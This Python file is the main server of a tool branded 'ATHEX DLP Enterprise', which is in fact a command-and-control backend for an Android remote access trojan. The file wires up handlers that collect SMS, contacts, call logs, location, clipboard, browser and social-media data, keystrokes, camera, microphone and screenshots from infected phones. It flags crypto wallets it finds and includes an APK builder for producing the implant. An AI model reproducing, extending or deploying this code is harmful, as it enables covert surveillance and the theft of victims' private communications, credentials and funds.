#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║              ATHEX DLP ENTERPRISE - MAIN SERVER                      ║
║                                                                      ║
║  Enterprise Remote Administration & Security System                  ║
║  Version 2.0.0                                                       ║
║                                                                      ║
║  Usage:                                                              ║
║    python app.py                                                     ║
║    python app.py --host 0.0.0.0 --port 5000 --tcp-port 22533       ║
║    python app.py --debug                                             ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import argparse
import logging
import threading
import time
import json
from datetime import datetime
from pathlib import Path

# Add server directory to path
sys.path.insert(0, str(Path(__file__).parent))

# Flask imports
from flask import Flask
from flask_socketio import SocketIO
from flask_cors import CORS

# ============================================================
# CONFIGURATION
# ============================================================
from config import Config

# Initialize configuration
Config.init_directories()

# ============================================================
# LOGGING SETUP
# ============================================================
logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format=Config.LOG_FORMAT,
    handlers=[
        logging.FileHandler(Config.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK APP INITIALIZATION
# ============================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['MAX_CONTENT_LENGTH'] = Config.MAX_MESSAGE_SIZE

# Enable CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# Initialize Socket.IO
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='threading',
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=Config.MAX_MESSAGE_SIZE
)

# ============================================================
# IMPORT CORE COMPONENTS
# ============================================================
from core.tcp_server import TCPServer
from core.device_manager import DeviceManager
from core.command_dispatcher import CommandDispatcher, CommandType
from core.socket_manager import SocketManager

# ============================================================
# IMPORT MODULES
# ============================================================
from modules.contacts import contacts_handler
from modules.sms import sms_handler
from modules.calls import calls_handler
from modules.files import files_handler
from modules.location import location_handler
from modules.notifications import notifications_handler
from modules.clipboard import clipboard_handler
from modules.apps import apps_handler
from modules.camera import camera_handler
from modules.microphone import microphone_handler
from modules.keylogger import keylogger_handler
from modules.browser import browser_handler
from modules.social import social_handler
from modules.crypto import crypto_handler
from modules.screen import screen_handler

# ============================================================
# IMPORT APK BUILDER
# ============================================================
from apk_builder.builder import APKBuilder

# ============================================================
# INITIALIZE COMPONENTS
# ============================================================

# Core components
tcp_server = TCPServer(host=Config.TCP_HOST, port=Config.TCP_PORT)
device_manager = DeviceManager(max_devices=Config.MAX_CLIENTS)
command_dispatcher = CommandDispatcher()
socket_manager = SocketManager()

# APK Builder
apk_builder = APKBuilder()

# Set up relationships
command_dispatcher.set_device_manager(device_manager)
command_dispatcher.set_tcp_server(tcp_server)
socket_manager.init_app(socketio, device_manager, command_dispatcher)

# ============================================================
# TCP SERVER MESSAGE HANDLER
# ============================================================
def handle_tcp_message(session_id: str, msg_type: str, msg_data: any):
    """
    Handle incoming messages from Android clients.
    Routes data to appropriate module handlers.
    """
    try:
        # Device Info
        if msg_type == "DEVICE_INFO":
            device_manager.register_device(session_id, {
                'device_model': msg_data[0] if isinstance(msg_data, list) and len(msg_data) > 0 else 'Unknown',
                'android_version': msg_data[1] if isinstance(msg_data, list) and len(msg_data) > 1 else 'Unknown',
                'device_id': msg_data[2] if isinstance(msg_data, list) and len(msg_data) > 2 else 'Unknown',
                'ip_address': msg_data[3] if isinstance(msg_data, list) and len(msg_data) > 3 else '0.0.0.0',
            })
            
            # Broadcast device connection
            device = device_manager.get_device(session_id)
            if device:
                socket_manager.broadcast_device_connected(device.to_dict())
                socket_manager.broadcast_terminal_log('success', 
                    f'Device connected: {device.model} ({device.android_version})')
        
        # Heartbeat
        elif msg_type == "HEARTBEAT":
            device = device_manager.get_device(session_id)
            if device:
                device.last_seen = datetime.now()
        
        # Notifications
        elif msg_type == "NOTIFICATION":
            if isinstance(msg_data, dict):
                result = notifications_handler.process(session_id, msg_data)
                if result.get('success'):
                    socket_manager.broadcast_notification(result['notification'])
        
        # File Listing
        elif msg_type == "FILE_LISTING":
            result = files_handler.process_listing(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_file_listing(session_id, result.get('files', []))
        
        # File Chunk
        elif msg_type == "FILE_CHUNK":
            result = files_handler.process_file_chunk(session_id, msg_data)
            if result.get('success') and result.get('path'):
                socket_manager.broadcast_terminal_log('success', 
                    f'File download complete: {result.get("size_formatted", "0 B")}')
        
        # Contacts
        elif msg_type == "CONTACTS":
            result = contacts_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_contacts_data(session_id, result.get('contacts', []))
                socket_manager.broadcast_terminal_log('info', 
                    f'Contacts received: {result.get("count", 0)} contacts')
        
        # SMS
        elif msg_type == "SMS":
            result = sms_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_sms_data(session_id, result.get('messages', []))
                socket_manager.broadcast_terminal_log('info', 
                    f'SMS received: {result.get("total_count", 0)} messages')
        
        # Call Logs
        elif msg_type == "CALLS":
            result = calls_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_call_logs(session_id, result.get('calls', []))
        
        # Location
        elif msg_type == "LOCATION":
            result = location_handler.process(session_id, msg_data)
            if result.get('success'):
                location = result.get('location', {})
                socket_manager.broadcast_location_update(session_id, location)
                
                # Update device location
                device = device_manager.get_device(session_id)
                if device and location:
                    device.update_location(
                        location.get('latitude'),
                        location.get('longitude')
                    )
        
        # Clipboard
        elif msg_type == "CLIPBOARD":
            result = clipboard_handler.process(session_id, msg_data)
            if result.get('success'):
                clipboard = result.get('clipboard', {})
                socket_manager.broadcast_clipboard_update(
                    session_id, 
                    clipboard.get('truncated', '')
                )
                
                if clipboard.get('has_sensitive'):
                    socket_manager.broadcast_terminal_log('warning',
                        f'⚠️ Sensitive data detected in clipboard from {session_id[:8]}...')
        
        # Apps
        elif msg_type == "APPS":
            result = apps_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_apps_data(session_id, result.get('apps', []))
        
        # WiFi
        elif msg_type == "WIFI":
            result = None  # wifi_handler.process(session_id, msg_data)
            if result and result.get('success'):
                socket_manager.broadcast_wifi_data(session_id, result.get('networks', []))
        
        # Browser
        elif msg_type == "BROWSER":
            result = browser_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_browser_data(session_id, result.get('data', {}))
        
        # Social Media
        elif msg_type == "SOCIAL":
            result = social_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_terminal_log('info',
                    f'Social media data received: {result.get("data", {}).get("total_messages", 0)} messages')
        
        # Crypto
        elif msg_type == "CRYPTO":
            result = crypto_handler.process(session_id, msg_data)
            if result.get('success'):
                socket_manager.broadcast_crypto_data(session_id, result.get('data', {}))
                
                data = result.get('data', {})
                if data.get('wallets_found', 0) > 0:
                    socket_manager.broadcast_terminal_log('warning',
                        f'🔐 {data["wallets_found"]} crypto wallets detected on {session_id[:8]}...')
        
        # Screenshot
        elif msg_type == "SCREENSHOT":
            result = screen_handler.process(session_id, msg_data)
            if result.get('success'):
                capture = result.get('capture', {})
                if capture.get('base64_preview'):
                    socket_manager.broadcast_screenshot(session_id, capture['base64_preview'])
                    socket_manager.broadcast_terminal_log('success',
                        f'Screenshot received: {capture.get("size_formatted", "0 B")}')
        
        # Status messages
        elif msg_type == "STATUS":
            logger.info(f"[{session_id}] Status: {msg_data}")
            socket_manager.broadcast_terminal_log('info', f'Device status: {msg_data}')
        
        # Error messages
        elif msg_type == "ERROR":
            logger.error(f"[{session_id}] Error: {msg_data}")
            socket_manager.broadcast_terminal_log('error', f'Device error: {msg_data}')
        
        # Command completed
        elif msg_type == "COMMAND_COMPLETE":
            if isinstance(msg_data, dict):
                command_id = msg_data.get('command_id')
                result_data = msg_data.get('result')
                if command_id:
                    command_dispatcher.complete_command(command_id, result_data)
                    socket_manager.broadcast_command_result({
                        'command_id': command_id,
                        'status': 'completed',
                        'result': result_data
                    })
        
        else:
            logger.debug(f"[{session_id}] Unknown message type: {msg_type}")
            
    except Exception as e:
        logger.error(f"Error handling message from {session_id}: {e}")

# Set the message handler
tcp_server.set_message_handler(handle_tcp_message)

# ============================================================
# DEVICE MANAGER CALLBACKS
# ============================================================
def on_device_connected(device):
    """Called when a device connects"""
    logger.info(f"📱 Device connected: {device.model}")
    socket_manager.broadcast_device_connected(device.to_dict())

def on_device_disconnected(device):
    """Called when a device disconnects"""
    logger.info(f"📴 Device disconnected: {device.model}")
    socket_manager.broadcast_device_disconnected(device.to_dict())

device_manager.set_callbacks(
    on_connected=on_device_connected,
    on_disconnected=on_device_disconnected
)

# ============================================================
# IMPORT & REGISTER DASHBOARD ROUTES
# ============================================================
from dashboard.routes import init_dashboard

init_dashboard(app,
    tcp_server=tcp_server,
    device_manager=device_manager,
    command_dispatcher=command_dispatcher,
    socket_manager=socket_manager,
    apk_builder=apk_builder,
    config=Config,
    contacts_handler=contacts_handler,
    sms_handler=sms_handler,
    calls_handler=calls_handler,
    files_handler=files_handler,
    location_handler=location_handler,
    notifications_handler=notifications_handler,
    clipboard_handler=clipboard_handler,
    apps_handler=apps_handler,
    camera_handler=camera_handler,
    microphone_handler=microphone_handler,
    keylogger_handler=keylogger_handler,
    browser_handler=browser_handler,
    social_handler=social_handler,
    crypto_handler=crypto_handler,
    screen_handler=screen_handler
)

# ============================================================
# STARTUP BANNER
# ============================================================
def print_startup_banner():
    """Print startup banner with server info"""
    banner = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║         █████╗ ████████╗██╗  ██╗███████╗██╗  ██╗                    ║
║        ██╔══██╗╚══██╔══╝██║  ██║██╔════╝╚██╗██╔╝                    ║
║        ███████║   ██║   ███████║█████╗   ╚███╔╝                     ║
║        ██╔══██║   ██║   ██╔══██║██╔══╝   ██╔██╗                     ║
║        ██║  ██║   ██║   ██║  ██║███████╗██╔╝ ██╗                    ║
║        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                    ║
║                                                                      ║
║           Data Loss Prevention & Enterprise Control                  ║
║                      Version {Config.VERSION}                            ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  🌐 Web Dashboard:  http://{Config.WEB_HOST if Config.WEB_HOST != '0.0.0.0' else '127.0.0.1'}:{Config.WEB_PORT}                         ║
║  📱 TCP Server:     {Config.TCP_HOST}:{Config.TCP_PORT}                              ║
║                                                                      ║
║  📁 Server Dir:     {Config.SERVER_DIR}                          ║
║  📋 Log File:       {Config.LOG_FILE}                          ║
║  📦 APK Output:     {Config.APK_OUTPUT_DIR}                          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

# ============================================================
# MAIN ENTRY POINT
# ============================================================
def main():
    """Main entry point"""
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='ATHEX DLP Enterprise Server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python app.py
  python app.py --host 0.0.0.0 --port 8080
  python app.py --tcp-port 4444 --debug
  python app.py --host 192.168.1.100 --port 5000 --tcp-port 22533
        """
    )
    
    parser.add_argument(
        '--host', 
        type=str, 
        default=Config.WEB_HOST,
        help=f'Web server host (default: {Config.WEB_HOST})'
    )
    parser.add_argument(
        '--port', 
        type=int, 
        default=Config.WEB_PORT,
        help=f'Web server port (default: {Config.WEB_PORT})'
    )
    parser.add_argument(
        '--tcp-port', 
        type=int, 
        default=Config.TCP_PORT,
        help=f'TCP server port for Android connections (default: {Config.TCP_PORT})'
    )
    parser.add_argument(
        '--debug', 
        action='store_true',
        help='Enable debug mode'
    )
    parser.add_argument(
        '--no-tcp', 
        action='store_true',
        help='Disable TCP server (web only)'
    )
    
    args = parser.parse_args()
    
    # Update config from arguments
    Config.WEB_HOST = args.host
    Config.WEB_PORT = args.port
    Config.TCP_PORT = args.tcp_port
    
    if args.debug:
        Config.WEB_DEBUG = True
        Config.LOG_LEVEL = 'DEBUG'
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Print banner
    print_startup_banner()
    
    # Start TCP Server
    if not args.no_tcp:
        try:
            tcp_server.host = Config.TCP_HOST
            tcp_server.port = Config.TCP_PORT
            tcp_server.start()
            logger.info(f"✅ TCP Server started on {Config.TCP_HOST}:{Config.TCP_PORT}")
        except Exception as e:
            logger.error(f"❌ Failed to start TCP Server: {e}")
            logger.warning("Continuing with web server only...")
    else:
        logger.info("TCP Server disabled (--no-tcp)")
    
    # Start Flask Web Server
    try:
        logger.info(f"🚀 Starting Web Dashboard on {args.host}:{args.port}")
        logger.info(f"📱 Open http://127.0.0.1:{args.port} in your browser")
        
        socketio.run(
            app,
            host=args.host,
            port=args.port,
            debug=args.debug,
            use_reloader=False,
            allow_unsafe_werkzeug=True
        )
        
    except KeyboardInterrupt:
        logger.info("🛑 Shutting down...")
    except Exception as e:
        logger.error(f"❌ Server error: {e}")
    finally:
        # Cleanup
        logger.info("Cleaning up...")
        
        tcp_server.stop()
        command_dispatcher.shutdown()
        socket_manager.shutdown()
        
        # Shutdown module handlers
        contacts_handler.shutdown() if hasattr(contacts_handler, 'shutdown') else None
        sms_handler.shutdown() if hasattr(sms_handler, 'shutdown') else None
        calls_handler.shutdown() if hasattr(calls_handler, 'shutdown') else None
        files_handler.shutdown() if hasattr(files_handler, 'shutdown') else None
        camera_handler.shutdown() if hasattr(camera_handler, 'shutdown') else None
        microphone_handler.shutdown() if hasattr(microphone_handler, 'shutdown') else None
        screen_handler.shutdown() if hasattr(screen_handler, 'shutdown') else None
        
        logger.info("✅ Server shut down complete")


# ============================================================
# RUN
# ============================================================
if __name__ == '__main__':
    main()